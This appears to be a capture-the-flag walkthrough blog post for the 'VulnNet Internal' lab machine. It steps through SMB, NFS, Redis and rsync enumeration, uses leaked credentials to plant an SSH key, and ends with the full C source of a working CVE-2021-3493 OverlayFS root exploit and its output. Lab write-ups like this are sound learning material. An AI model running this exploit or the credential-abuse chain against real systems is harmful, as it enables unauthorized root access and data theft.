<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="095a" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ nmap -A -vv 10.10.96.14 &gt;nmap<br><br>NSE: Loaded 155 scripts for scanning.<br>NSE: Script Pre-scanning.<br>NSE: Starting runlevel 1 (of 3) scan.<br>Initiating NSE at 07:08<br>Completed NSE at 07:08, 0.00s elapsed<br>NSE: Starting runlevel 2 (of 3) scan.<br>Initiating NSE at 07:08<br>Completed NSE at 07:08, 0.00s elapsed<br>NSE: Starting runlevel 3 (of 3) scan.<br>Initiating NSE at 07:08<br>Completed NSE at 07:08, 0.00s elapsed<br>Initiating Ping Scan at 07:08<br>Scanning 10.10.96.14 [2 ports]<br>Completed Ping Scan at 07:08, 0.20s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 07:08<br>Completed Parallel DNS resolution of 1 host. at 07:08, 0.03s elapsed<br>Initiating Connect Scan at 07:08<br>Scanning 10.10.96.14 [1000 ports]<br>Discovered open port 139/tcp on 10.10.96.14<br>Discovered open port 111/tcp on 10.10.96.14<br>Discovered open port 22/tcp on 10.10.96.14<br>Discovered open port 445/tcp on 10.10.96.14<br>Discovered open port 2049/tcp on 10.10.96.14<br>Discovered open port 873/tcp on 10.10.96.14<br>Increasing send delay for 10.10.96.14 from 0 to 5 due to max_successful_tryno increase to 4<br>Completed Connect Scan at 07:09, 34.33s elapsed (1000 total ports)<br>Initiating Service scan at 07:09<br>Scanning 6 services on 10.10.96.14<br>Completed Service scan at 07:09, 11.66s elapsed (6 services on 1 host)<br>NSE: Script scanning 10.10.96.14.<br>NSE: Starting runlevel 1 (of 3) scan.<br>Initiating NSE at 07:09<br>Completed NSE at 07:09, 6.47s elapsed<br>NSE: Starting runlevel 2 (of 3) scan.<br>Initiating NSE at 07:09<br>Completed NSE at 07:09, 0.43s elapsed<br>NSE: Starting runlevel 3 (of 3) scan.<br>Initiating NSE at 07:09<br>Completed NSE at 07:09, 0.00s elapsed<br>Nmap scan report for 10.10.96.14<br>Host is up, received conn-refused (0.21s latency).<br>Scanned at 2022–01–15 07:08:47 EST for 53s<br>Not shown: 990 closed tcp ports (conn-refused)<br>PORT STATE SERVICE REASON VERSION<br>22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>| 2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)<br>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDagA3GVO7hKpJpO1Vr6+z3Y9xjoeihZFWXSrBG2MImbpPH6jk+1KyJwQpGmhMEGhGADM1LbmYf3goHku11Ttb0gbXaCt+mw1Ea+K0H00jA0ce2gBqev+PwZz0ysxCLUbYXCSv5Dd1XSa67ITSg7A6h+aRfkEVN2zrbM5xBQiQv6aBgyaAvEHqQ73nZbPdtwoIGkm7VL9DATomofcEykaXo3tmjF2vRTN614H0PpfZBteRpHoJI4uzjwXeGVOU/VZcl7EMBd/MRHdspvULJXiI476ID/ZoQLT2zQf5Q2vqI3ulMj5CB29ryxq58TVGSz/sFv1ZBPbfOl9OvuBM5BTBV<br>| 256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)<br>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNM0XfxK0hrF7d4C5DCyQGK3ml9U0y3Nhcvm6N9R+qv2iKW21CNEFjYf+ZEEi7lInOU9uP2A0HZG35kEVmuideE=<br>| 256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)<br>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPRO3XCBfxEo0XhViW8m/V+IlTWehTvWOyMDOWNJj+i<br>111/tcp open rpcbind syn-ack 2–4 (RPC #100000)<br>| rpcinfo: <br>| program version port/proto service<br>| 100000 2,3,4 111/tcp rpcbind<br>| 100000 2,3,4 111/udp rpcbind<br>| 100000 3,4 111/tcp6 rpcbind<br>| 100000 3,4 111/udp6 rpcbind<br>| 100003 3 2049/udp nfs<br>| 100003 3 2049/udp6 nfs<br>| 100003 3,4 2049/tcp nfs<br>| 100003 3,4 2049/tcp6 nfs<br>| 100005 1,2,3 47846/udp6 mountd<br>| 100005 1,2,3 51893/tcp mountd<br>| 100005 1,2,3 52114/udp mountd<br>| 100005 1,2,3 54049/tcp6 mountd<br>| 100021 1,3,4 39323/udp nlockmgr<br>| 100021 1,3,4 41673/tcp nlockmgr<br>| 100021 1,3,4 41907/tcp6 nlockmgr<br>| 100021 1,3,4 59210/udp6 nlockmgr<br>| 100227 3 2049/tcp nfs_acl<br>| 100227 3 2049/tcp6 nfs_acl<br>| 100227 3 2049/udp nfs_acl<br>|_ 100227 3 2049/udp6 nfs_acl<br>139/tcp open netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp open netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br>873/tcp open rsync syn-ack (protocol version 31)<br>1086/tcp filtered cplscrambler-lg no-response<br>2049/tcp open nfs_acl syn-ack 3 (RPC #100227)<br>3945/tcp filtered emcads no-response<br>9090/tcp filtered zeus-admin no-response<br>56738/tcp filtered unknown no-response<br>Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>Host script results:<br>|_clock-skew: mean: -6h20m03s, deviation: 34m38s, median: -6h00m03s<br>| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| Names:<br>| VULNNET-INTERNA&lt;00&gt; Flags: &lt;unique&gt;&lt;active&gt;<br>| VULNNET-INTERNA&lt;03&gt; Flags: &lt;unique&gt;&lt;active&gt;<br>| VULNNET-INTERNA&lt;20&gt; Flags: &lt;unique&gt;&lt;active&gt;<br>| WORKGROUP&lt;00&gt; Flags: &lt;group&gt;&lt;active&gt;<br>| WORKGROUP&lt;1e&gt; Flags: &lt;group&gt;&lt;active&gt;<br>| Statistics:<br>| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>|_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>| smb2-time: <br>| date: 2022–01–15T06:09:31<br>|_ start_date: N/A<br>| smb2-security-mode: <br>| 3.1.1: <br>|_ Message signing enabled but not required<br>| smb-security-mode: <br>| account_used: guest<br>| authentication_level: user<br>| challenge_response: supported<br>|_ message_signing: disabled (dangerous, but default)<br>| p2p-conficker: <br>| Checking for Conficker.C or higher…<br>| Check 1 (port 53408/tcp): CLEAN (Couldn't connect)<br>| Check 2 (port 34685/tcp): CLEAN (Couldn't connect)<br>| Check 3 (port 9485/udp): CLEAN (Failed to receive data)<br>| Check 4 (port 22333/udp): CLEAN (Failed to receive data)<br>|_ 0/4 checks are positive: Host is CLEAN or ports are blocked<br>| smb-os-discovery: <br>| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)<br>| Computer name: vulnnet-internal<br>| NetBIOS computer name: VULNNET-INTERNAL\x00<br>| Domain name: \x00<br>| FQDN: vulnnet-internal</span></pre>
<p id="d113" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">As you can see, multiple ports are open and different services are running on each port. First let’s enumerate the SMB shares using the following command:</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="5d8d" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ smbmap -H 10.10.96.14<br>[+] Guest session   	IP: 10.10.96.14:445	Name: 10.10.96.14                                       <br>        Disk                                                  	Permissions	Comment<br>	----                                                  	-----------	-------<br>	print$                                            	NO ACCESS	Printer Drivers<br>	shares                                            	READ ONLY	VulnNet Business Shares<br>	IPC$                                              	NO ACCESS	IPC Service (vulnnet-internal server (Samba, Ubuntu))</span></pre>
<h2 id="92aa" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">First Flag</h2>
<p id="3ca8" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">Now let’s try anonymous access on SMB share “shares” using the following command.</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="89f1" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ smbclient //10.10.96.14/shares<br>Enter WORKGROUP\sak's password: <br>Try "help" to get a list of possible commands.<br>smb: \&gt; ls                                       <br>  temp                               <br>  data                               <br>smb: \&gt;</span></pre>
<p id="7cd5" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We found three files in both temp and data directory and using the <code class="ff abm abn abo abp b">get</code> command we can download all the files in our local system. Just download all file and you got your first flag from those file.</p>
<blockquote>
<p id="87c2" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><em>Note: In one of the files we found our first flag. But the other two files didn’t have any useful information.</em></p>
</blockquote>
<h2 id="5133" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Second Flag</h2>
<p id="e4f1" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">Looking at the NMAP service scan from earlier, I saw that port 2049 was open and noticed that there was a lot of output for port 111. I can see in the output for port 111, that the service <strong class="ly kz">NFS </strong>was present in the output. This indicates that I might be able to list and download (and maybe upload) files.</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="07fb" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ sudo showmount -e 10.10.96.14<br>[sudo] password for sak: <br>Export list for 10.10.96.14:<br>/opt/conf *</span></pre>
<p id="4638" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we need to mount <code class="ff abm abn abo abp b">/opt/conf</code> in our local directory, and for that we need to create a mount point (directory) with the name mount0.</p>
<p id="3d88" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">While traversing different directories we found something interesting in the <code class="ff abm abn abo abp b">redis</code> directory , <code class="ff abm abn abo abp b">redis.conf</code> contains the password for <code class="ff abm abn abo abp b">redis</code>.</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="1494" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ cat redis.conf | grep "pass"<br># 2) No password is configured.<br># If the master is password protected (using the "requirepass" configuration<br># masterauth &lt;master-password&gt;<br>requirepass "B65Hx562F*****"<br><br></span></pre>
<p id="ead5" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we can access <code class="ff abm abn abo abp b">redis</code> using <code class="ff abm abn abo abp b">redis-cli</code> utility using the following command:</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="2016" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ redis-cli -h 10.10.96.14 -p 6379 -a "B65Hx562F****"<br>Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.<br>10.10.96.14:6379&gt;</span></pre>
<p id="b8f1" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><strong>In here -h (IP) &amp; -a(Password)</strong></p>
<p id="1543" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">To get all the keys in <code class="ff abm abn abo abp b">redis</code>, we can run the command <code class="ff abm abn abo abp b">KEYS *</code>.</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="b46f" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">10.10.96.14:6379&gt; KEYS * 1) "int" 2) "internal flag" 3) "authlist" 4) "tmp" 5) "marketlist" 10.10.96.14:6379&gt;</span></pre>
<p id="c96e" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Our second flag is present in the file named <code class="ff abm abn abo abp b">internal flag</code> and we can read it using the command:</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="79a3" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">GET "internal flag"</span></pre>
<h2 id="207d" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">User Flag</h2>
<p id="ce1d" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">To find the type of a key in redis we run the command “type &lt;key_name&gt;”</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="5e83" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">10.10.96.14:6379&gt; type authlist<br>list</span></pre>
<p id="52c6" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We found that <code class="ff abm abn abo abp b">authlist</code> is a list type key and to read it's value we can run the following command:</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="fe66" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">10.10.96.14:6379&gt; lrange authlist 1 10<br>1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4**************************"<br><br></span></pre>
<p id="c37e" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><em>In here we got four base64 message.</em></p>
<p id="1ef6" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After decoding this base64 message, we found the credentials for rsync.</p>
<blockquote>
<p id="de66" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz"><em class="tu">N.B.</em></strong><em class="tu"> rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers.</em></p>
</blockquote>
<p id="14c8" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Rsync, or Remote Sync, is a free command-line tool that lets you transfer files and directories to local and remote destinations. Rsync is used for mirroring, performing backups, or migrating data to other servers.</p>
<p id="fcfc" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">To get name of all the files or directories we can use the following command:</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="ed12" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">$rsync -av rsync://rsync-connect@10.10.96.14/files/sys-internal/<br>Password: <br>receiving incremental file list<br>created directory /sys-internal/</span></pre>
<p id="04db" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After the command is executed, all the files will be copied in <strong class="ly kz">/sys-internal/</strong> directory in our local system and there we found the user flag.</p>
<p id="fe50" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><em>Or you also use this command.</em></p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="5777" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">$ rsync rsync://rsync-connect@10.10.96.14/files/sys-internal/ user.txt .</span></pre>
<h2 id="3c26" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">User Shell Access</h2>
<p id="4212" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">While enumerating <code class="ff abm abn abo abp b">sys-internal</code> files and directories, we found <code class="ff abm abn abo abp b">.ssh</code> directory and we know that using <code class="ff abm abn abo abp b">rsync</code> we can upload files. So we upload our <code class="ff abm abn abo abp b">id_rsa.pub</code> to the <code class="ff abm abn abo abp b">.ssh</code> directory using the command shown below.</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="2337" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ rsync /home/sak/.ssh/id_rsa.pub rsync://rsync-connect@10.10.96.14/files/sys-internal/.ssh/authorized_keys<br>Password:<br><br>sent 661 bytes  received 144 bytes  84.74 bytes/sec<br>total size is 565  speedup is 0.70</span></pre>
<p id="f459" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we can easily get user shell access by using <code class="ff abm abn abo abp b">id_rsa</code> private key.</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="01a6" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ sudo ssh sys-internal@10.10.96.14 -i /home/sak/.ssh/id_rsa<br>[sudo] password for sak: .<br><br>sys-internal@vulnnet-internal:~$ id<br>uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)</span></pre>
<p id="88c3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we have a SSH access to the target machine.</p>
<h2 id="30e9" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Privilege Escalation</h2>
<p id="2259" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">In here I upload “linpias.sh” script to identify What type of command I can run. I find os vertion “ubuntu 18.4”. we all know it have</p>
<p id="b4ee" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">— OverlayFS PE <strong class="ly kz">Vulnerability.</strong></p>
<p id="801b" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">Reference Link <a class="af rn" href="https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/" rel="noopener ugc nofollow" target="_blank">https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/</a></p>
<p id="eb20" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">CVE<em>— </em></strong>CVE-2021–3493</p>
<p id="283b" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">So, we can get root privilege by this <strong class="ly kz">Exploit-</strong></p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="73ae" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">#define _GNU_SOURCE<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;err.h&gt;<br>#include &lt;errno.h&gt;<br>#include &lt;sched.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;sys/wait.h&gt;<br>#include &lt;sys/mount.h&gt;<br><br>//#include &lt;attr/xattr.h&gt;<br>//#include &lt;sys/xattr.h&gt;<br>int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);<br><br><br>#define DIR_BASE    "./ovlcap"<br>#define DIR_WORK    DIR_BASE "/work"<br>#define DIR_LOWER   DIR_BASE "/lower"<br>#define DIR_UPPER   DIR_BASE "/upper"<br>#define DIR_MERGE   DIR_BASE "/merge"<br>#define BIN_MERGE   DIR_MERGE "/magic"<br>#define BIN_UPPER   DIR_UPPER "/magic"<br><br><br>static void xmkdir(const char *path, mode_t mode)<br>{<br>    if (mkdir(path, mode) == -1 &amp;&amp; errno != EEXIST)<br>        err(1, "mkdir %s", path);<br>}<br><br>static void xwritefile(const char *path, const char *data)<br>{<br>    int fd = open(path, O_WRONLY);<br>    if (fd == -1)<br>        err(1, "open %s", path);<br>    ssize_t len = (ssize_t) strlen(data);<br>    if (write(fd, data, len) != len)<br>        err(1, "write %s", path);<br>    close(fd);<br>}<br><br>static void xcopyfile(const char *src, const char *dst, mode_t mode)<br>{<br>    int fi, fo;<br><br>    if ((fi = open(src, O_RDONLY)) == -1)<br>        err(1, "open %s", src);<br>    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)<br>        err(1, "open %s", dst);<br><br>    char buf[4096];<br>    ssize_t rd, wr;<br><br>    for (;;) {<br>        rd = read(fi, buf, sizeof(buf));<br>        if (rd == 0) {<br>            break;<br>        } else if (rd == -1) {<br>            if (errno == EINTR)<br>                continue;<br>            err(1, "read %s", src);<br>        }<br><br>        char *p = buf;<br>        while (rd &gt; 0) {<br>            wr = write(fo, p, rd);<br>            if (wr == -1) {<br>                if (errno == EINTR)<br>                    continue;<br>                err(1, "write %s", dst);<br>            }<br>            p += wr;<br>            rd -= wr;<br>        }<br>    }<br><br>    close(fi);<br>    close(fo);<br>}<br><br>static int exploit()<br>{<br>    char buf[4096];<br><br>    sprintf(buf, "rm -rf '%s/'", DIR_BASE);<br>    system(buf);<br><br>    xmkdir(DIR_BASE, 0777);<br>    xmkdir(DIR_WORK,  0777);<br>    xmkdir(DIR_LOWER, 0777);<br>    xmkdir(DIR_UPPER, 0777);<br>    xmkdir(DIR_MERGE, 0777);<br><br>    uid_t uid = getuid();<br>    gid_t gid = getgid();<br><br>    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)<br>        err(1, "unshare");<br><br>    xwritefile("/proc/self/setgroups", "deny");<br><br>    sprintf(buf, "0 %d 1", uid);<br>    xwritefile("/proc/self/uid_map", buf);<br><br>    sprintf(buf, "0 %d 1", gid);<br>    xwritefile("/proc/self/gid_map", buf);<br><br>    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);<br>    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)<br>        err(1, "mount %s", DIR_MERGE);<br><br>    // all+ep<br>    char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";<br><br>    xcopyfile("/proc/self/exe", BIN_MERGE, 0777);<br>    if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)<br>        err(1, "setxattr %s", BIN_MERGE);<br><br>    return 0;<br>}<br><br>int main(int argc, char *argv[])<br>{<br>    if (strstr(argv[0], "magic") || (argc &gt; 1 &amp;&amp; !strcmp(argv[1], "shell"))) {<br>        setuid(0);<br>        setgid(0);<br>        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);<br>        err(1, "execl /bin/bash");<br>    }<br><br>    pid_t child = fork();<br>    if (child == -1)<br>        err(1, "fork");<br><br>    if (child == 0) {<br>        _exit(exploit());<br>    } else {<br>        waitpid(child, NULL, 0);<br>    }<br><br>    execl(BIN_UPPER, BIN_UPPER, "shell", NULL);<br>    err(1, "execl %s", BIN_UPPER);<br>}</span></pre>
<p id="c725" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now save The above code &amp; copy it.</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="d675" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯sys-internal@vulnnet-internal:~$ nano exploit.c<br>/put here the above code<br>//than close nano</span></pre>
<p id="fc6b" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we need to compile it..</p>
<p id="9781" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><em>Reference —</em> <a class="af rn" href="https://ssd-disclosure.com/wp-content/uploads/2021/04/ubuntu.gif" rel="noopener ugc nofollow" target="_blank">https://ssd-disclosure.com/wp-content/uploads/2021/04/ubuntu.gif</a></p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="acf acg dj ach bg aci" tabindex="0" role="button">
<div class="kl km ace">
<figure class="bg yx yy c"><figure class="is-loaded"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/0*2snuFHyTasNIbC5t.gif" alt="" width="700" height="342" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
</div>
</figure>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="2fc3" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯sys-internal@vulnnet-internal:~$ gcc exploit.c -o exploit</span></pre>
<p id="7a11" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now run the exploit..</p>
<pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="d96e" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯sys-internal@vulnnet-internal:~$ ./exploit<br>bash-4.4# id<br>uid=1000(sys-internal) gid=1000(sys-internal) euid=0(root) groups=1000(sys-internal),24(cdrom)<br>bash-4.4# cd /root<br>bash-4.4# ls<br>root.txt<br>bash-4.4# cat root.txt |wc -c<br>38<br>bash-4.4#</span></pre>
<p id="7dfc" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We are root now and a very interesting room is completed!</p>
<h4 id="e906" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">In this room, we learned about —</h4>
<ul>
<li id="e321" class="xw xx tu ly b xy abh ya yb yc abi ye yf abu abj yh yi abv abk yk yl abw abl yn yo yp acj ack acl bj" data-selectable-paragraph="">SMB service enumeration</li>
<li id="5344" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">RPC Service enumeration</li>
<li id="2316" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">use of rsync</li>
<li id="6e01" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">Team service Project and build configuration</li>
<li id="1ce3" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph="">CVE-2021–3493 — OverlayFS PE Vulnerability</li>
</ul>
<p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p>
<p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>: <a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p>
<p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy VulnNet Internal~</strong></p>
<figure class="yq yr ys yt yu yv kl km paragraph-image"><a href="https://www.buymeacoffee.com/sakibulalikhan"></a></figure>
</div>
<footer></footer></div>
            ]]>
        </content>
    </entry>
</feed>
